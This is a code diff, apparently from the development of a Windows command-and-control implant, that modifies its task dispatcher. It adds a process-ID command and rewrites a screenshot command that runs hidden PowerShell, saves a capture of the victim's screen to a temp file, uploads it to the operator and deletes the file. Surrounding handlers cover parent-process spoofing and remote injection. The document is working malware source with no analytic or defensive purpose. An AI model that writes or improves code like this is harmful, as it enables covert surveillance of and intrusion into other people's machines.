@@ -360,6 +360,11 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id, out, "");
         free(out);
     }
+    else if (strcmp(type_upper, "GETPID") == 0) {
+        char buf[32];
+        snprintf(buf, sizeof(buf), "%lu", GetCurrentProcessId());
+        agent_send_result(task->id, buf, "");
+    }
     else if (strcmp(type_upper, "PPID") == 0) {
         /* args JSON: {"cmd":"notepad.exe","parent":"explorer.exe"} */
         char cmd[512] = {0}, parent[128] = "explorer.exe";
@@ -487,31 +492,37 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id, msg, "");
     }
     else if (strcmp(type_upper, "SCREENSHOT") == 0) {
+        /* Use virtual-screen bounds so it works on headless/server Windows too */
+        const char *sc_path = "C:\\Windows\\Temp\\_sc.png";
         char *out = run_shell("powershell.exe -NoP -NonI -W Hidden -C \""
             "Add-Type -Assembly System.Windows.Forms,System.Drawing;"
-            "$b=[Drawing.Bitmap]::new([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,"
-            "[Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);"
-            "$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen(0,0,0,0,$b.Size);"
-            "$ms=[IO.MemoryStream]::new();$b.Save($ms,'Png');"
-            "$path='C:\\\\Windows\\\\Temp\\\\_sc.png';$b.Save($path);"
-            "Write-Output $path\"");
-        /* upload the saved file */
-        if (out && out[0]) {
-            char fpath[MAX_PATH] = {0};
-            sscanf(out, " %259s", fpath);
-            free(out);
-            HANDLE hf = CreateFileA(fpath, GENERIC_READ, FILE_SHARE_READ, NULL,
+            "try {"
+            "$w=[Windows.Forms.SystemInformation]::VirtualScreen.Width;"
+            "$h=[Windows.Forms.SystemInformation]::VirtualScreen.Height;"
+            "if($w -le 0){$w=1920};if($h -le 0){$h=1080};"
+            "$b=[Drawing.Bitmap]::new($w,$h);"
+            "$g=[Drawing.Graphics]::FromImage($b);"
+            "$g.CopyFromScreen(0,0,0,0,[Drawing.Size]::new($w,$h));"
+            "$p='C:\\\\Windows\\\\Temp\\\\_sc.png';"
+            "$b.Save($p,[Drawing.Imaging.ImageFormat]::Png);"
+            "$g.Dispose();$b.Dispose();"
+            "Write-Output OK"
+            "} catch { Write-Output ERR }\"");
+        int ps_ok = out && strncmp(out, "OK", 2) == 0;
+        if (out) free(out);
+        if (ps_ok) {
+            HANDLE hf = CreateFileA(sc_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
             if (hf != INVALID_HANDLE_VALUE) {
                 DWORD fsz = GetFileSize(hf, NULL);
                 uint8_t *data = (uint8_t*)malloc(fsz);
                 DWORD rd = 0; ReadFile(hf, data, fsz, &rd, NULL); CloseHandle(hf);
                 agent_upload_file(task->id, "screenshot.png", data, rd);
-                free(data); DeleteFileA(fpath);
+                free(data); DeleteFileA(sc_path);
                 char m[64]; snprintf(m, 64, "[+] screenshot (%lu bytes)", rd);
                 agent_send_result(task->id, m, "");
-            } else agent_send_result(task->id, "", "screenshot: file save failed");
-        } else { free(out); agent_send_result(task->id, "", "screenshot: powershell failed"); }
+            } else agent_send_result(task->id, "", "screenshot: file open failed");
+        } else agent_send_result(task->id, "", "screenshot: capture failed (headless?)");
     }
     else if (strcmp(type_upper, "INJECT_REMOTE") == 0) {
         if (!task->payload || task->payload_len == 0) {
